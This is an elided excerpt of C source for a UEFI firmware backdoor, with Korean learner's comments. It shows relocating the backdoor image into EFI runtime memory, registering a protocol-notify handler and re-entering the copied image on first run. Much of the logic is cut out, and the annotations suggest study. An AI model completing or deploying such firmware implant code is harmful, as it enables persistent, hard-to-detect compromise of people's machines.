...
//----------------------------------------------sound
#define BACKDOOR_RELOCATED_ADDR(_sym_, _addr_)   RVATOVA((_addr_), (UINT64)(_sym_) - (UINT64)m_ImageBase)
...
PVOID BackdoorImageReallocate(PVOID Image)//m_imagebase이다...
{
	EFI_IMAGE_NT_HEADERS* pHeaders = (EFI_IMAGE_NT_HEADERS*)RVATOVA(Image,
		((EFI_IMAGE_DOS_HEADER*)Image)->e_lfanew);//EFI 이미지 nt 해더 포인트 
...
VOID BackdoorEntryResident(PVOID Image)
{
	...
	RegisterProtocolNotifyDxe(&gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler, &Event, &Registration); //EFI silple text out guid/ 
...
HmonEntry(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable) {
	...
	if (Status == EFI_SUCCESS) {
		...
		if (Status == EFI_SUCCESS){
			...
			if (m_ImageHandle == NULL) //초회차 증명... 초회차에만 이걸 한다...
			{
				...
				DbgMsg(__FILE__, __LINE__, "Image base address is "FPTR"\r\n", m_ImageBase);   //여기 까지는 둘이 똑같아요... 

				// copy image to the new location in EFI runtime memory 뒤에 재할당을 시도 함.. 재할당이 또 뭐냐면..
				if ((Image = BackdoorImageReallocate(m_ImageBase)) != NULL) //어딘가에 쑤셔 넣고....
				{
					...
					pEntry(Image); // 그 주소에다가 지기 위치를 알려주는것이야..
				}
			}
